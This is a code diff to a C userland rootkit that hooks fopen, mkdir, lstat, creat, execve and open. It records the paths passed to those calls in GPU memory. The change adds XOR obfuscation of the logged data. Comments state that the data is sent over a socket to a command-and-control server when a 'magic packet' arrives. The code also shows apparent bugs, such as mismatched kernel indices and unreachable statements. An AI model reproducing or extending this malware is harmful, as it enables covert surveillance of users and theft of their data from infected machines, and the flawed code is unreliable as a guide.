@@ -118,7 +118,7 @@ void got_packet(unsigned char *args, const struct pcap_pkthdr *header, const uns
     }
 }
 
-static void send_data(const char *buffer){
+static void send_data(char *buffer){
     struct sockaddr_in serv_addr;
 
     int sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -143,9 +143,9 @@ static void send_data(const char *buffer){
     }
 }
 
+// gpu syscall xor ex.
 void jelly_init(){
     int i;
-
     for(i = 0; i < SYSCALL_SIZE; i++){
 	jelly->dev = create_device();
         jelly->ctx = create_ctx(&jelly->dev);
@@ -210,7 +210,54 @@ void jelly_init(){
     }
 }
 
-static void limit_buf(const char *buffer){
+// gpu syscall xor data ex.
+static char *xor_data(char *buf){
+    jelly->dev = create_device();
+    jelly->ctx = create_ctx(&jelly->dev);
+    jelly->program = build_program(jelly->ctx, jelly->dev, __JELLYXOR__);
+
+    input = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buf, &err);
+    local = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer2, &err);
+    group = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer3, &err);
+
+    // device command queue
+    jelly->cq = clCreateCommandQueue(jelly->ctx, jelly->dev, 0, &err);
+    if(err < 0){
+        // queue failed
+    }
+
+    // gpu kernel thread
+    jelly->kernels[7] = clCreateKernel(jelly->program, jelly_xor, &err);
+    if(err < 0){
+        // gpu kernel failed
+    }
+
+    // gpu kernel args
+    err = clSetKernelArg(jelly->kernels[0], 0, sizeof(cl_mem), &log);
+    err |= clSetKernelArg(jelly->kernels[0], 1, sizeof(cl_mem), &output);
+    err |= clSetKernelArg(jelly->kernels[0], 2, sizeof(cl_mem), &storage);
+    if(err < 0){
+        // args failed
+    }
+
+    // host-device comm
+    err = clEnqueueNDRangeKernel(jelly->cq, jelly->kernels[0], 1, NULL, &global_size, &local_size, 0, NULL, NULL);
+    if(err < 0){
+        // enqueue failed
+    }
+
+    // read buf from gpu
+    err = clEnqueueReadBuffer(jelly->cq, output, CL_TRUE, 0, sizeof(buffer3), buffer3, 0, NULL, NULL);
+    if(err < 0){
+        // read buffer failed
+    } else{
+        return buffer3;
+	buffer2 = "";
+	buffer = "";
+    }
+}
+
+static void limit_buf(char *buffer){
     if(sizeof(buffer) >= VRAM_LIMIT){
         buffer = "Buffer too big for GPU!";
     }
@@ -230,7 +277,11 @@ FILE *fopen(const char *path, const char *mode){
     strcat(buffer, path);
     limit_buf(buffer);
 
-    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer, &err);
+    // buffer now encrypted
+    char *xor_buffer = xor_data(buffer);
+
+    // encrypted gpu storage
+    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), xor_buffer, &err);
     output = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer2, &err);
     storage = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer3, &err);
     if(err < 0){
@@ -263,7 +314,7 @@ FILE *fopen(const char *path, const char *mode){
         // enqueue failed
     }
 
-    // buffer is now inside gpu
+    // encrypted buffer is now inside gpu
 
     // if packet from server matches ack-seq keys, dump gpu data, else keep stuffing gpu with more
     if(correct_packet){
@@ -271,6 +322,7 @@ FILE *fopen(const char *path, const char *mode){
 	if(err < 0){
 	    // gpu buffer read failed
 	}
+	// unencrypt from server side later
 	send_data(buffer);  // send dumped data via socket to c&c
 	clReleaseMemObject(storage);  // reset storage since attacker chose to dump
     }
@@ -282,12 +334,12 @@ FILE *fopen(const char *path, const char *mode){
 
     // release gpu memory then start over when syscall is called again
     // we dont release storage object as it will continue to record data to gpu if attacker has not sent magic packet yet
-    clReleaseContext(jelly->ctx);
-    clReleaseProgram(jelly->program);
     clReleaseMemObject(log);
     clReleaseMemObject(output);
     clReleaseCommandQueue(jelly->cq);
     clReleaseKernel(jelly->kernels[0]);
+    clReleaseContext(jelly->ctx);
+    clReleaseProgram(jelly->program);
 
     return syscall[SYS_FOPEN].syscall_func(path, mode);
 }
@@ -303,7 +355,9 @@ int mkdir(int dfd, const char *pathname, const char *mode){
     strcat(buffer, pathname);
     limit_buf(buffer);
 
-    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer, &err);
+    char *xor_buffer = xor_data(buffer);
+
+    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), xor_buffer, &err);
     output = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer2, &err);
     storage = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer3, &err);
     if(err < 0){
@@ -351,15 +405,14 @@ int mkdir(int dfd, const char *pathname, const char *mode){
     // reset
     buffer3 = "";
     buffer2 = "";
-    buffer = "";    
+    buffer = "";
 
-    // release gpu memory then start over when syscall is called again
-    clReleaseContext(jelly->ctx);
-    clReleaseProgram(jelly->program);
     clReleaseMemObject(log);
     clReleaseMemObject(output);
     clReleaseCommandQueue(jelly->cq);
     clReleaseKernel(jelly->kernels[1]);
+    clReleaseContext(jelly->ctx);
+    clReleaseProgram(jelly->program);
 
     return syscall[SYS_MKDIR].syscall_func(dfd, pathname, mode);
 }
@@ -375,7 +428,9 @@ int lstat(const char *filename, struct stat *buf){
     strcat(buffer, filename);
     limit_buf(buffer);
 
-    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer, &err);
+    char *xor_buffer = xor_data(buffer);
+
+    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), xor_buffer, &err);
     output = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer2, &err);
     storage = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer3, &err);
     if(err < 0){
@@ -426,12 +481,13 @@ int lstat(const char *filename, struct stat *buf){
     buffer = "";
 
     // release gpu memory then start over when syscall is called again
-    clReleaseContext(jelly->ctx);
-    clReleaseProgram(jelly->program);
+    // we dont release storage object as it will continue to record data to gpu if attacker has not sent magic packet yet
     clReleaseMemObject(log);
     clReleaseMemObject(output);
     clReleaseCommandQueue(jelly->cq);
     clReleaseKernel(jelly->kernels[2]);
+    clReleaseContext(jelly->ctx);
+    clReleaseProgram(jelly->program);
 
     return syscall[SYS_LSTAT].syscall_func(filename, buf);
 }
@@ -447,7 +503,9 @@ int lstat64(const char *filename, struct stat64 *buf){
     strcat(buffer, filename);
     limit_buf(buffer);
 
-    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer, &err);
+    char *xor_buffer = xor_data(buffer);
+
+    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), xor_buffer, &err);
     output = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer2, &err);
     storage = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer3, &err);
     if(err < 0){
@@ -519,7 +577,9 @@ int creat(const char *pathname, int mode){
     strcat(buffer, pathname);
     limit_buf(buffer);
 
-    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer, &err);
+    char *xor_buffer = xor_data(buffer);
+
+    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), xor_buffer, &err);
     output = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer2, &err);
     storage = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer3, &err);
     if(err < 0){
@@ -591,7 +651,9 @@ int execve(const char *filename, const char **argv, const char **envp){
     strcat(buffer, filename);
     limit_buf(buffer);
 
-    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer, &err);
+    char *xor_buffer = xor_data(buffer);
+
+    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), xor_buffer, &err);
     output = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer2, &err);
     storage = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer3, &err);
     if(err < 0){
@@ -642,12 +704,13 @@ int execve(const char *filename, const char **argv, const char **envp){
     buffer = "";
 
     // release gpu memory then start over when syscall is called again
-    clReleaseContext(jelly->ctx);
-    clReleaseProgram(jelly->program);
+    // we dont release storage object as it will continue to record data to gpu if attacker has not sent magic packet yet
     clReleaseMemObject(log);
     clReleaseMemObject(output);
     clReleaseCommandQueue(jelly->cq);
     clReleaseKernel(jelly->kernels[5]);
+    clReleaseContext(jelly->ctx);
+    clReleaseProgram(jelly->program);
 
     return syscall[SYS_EXECVE].syscall_func(filename, argv, envp);
 }
@@ -663,7 +726,9 @@ int open(const char *pathname, int flags, mode_t mode){
     strcat(buffer, pathname);
     limit_buf(buffer);
 
-    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer, &err);
+    char *xor_buffer = xor_data(buffer);
+
+    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), xor_buffer, &err);
     output = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer2, &err);
     storage = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer3, &err);
     if(err < 0){
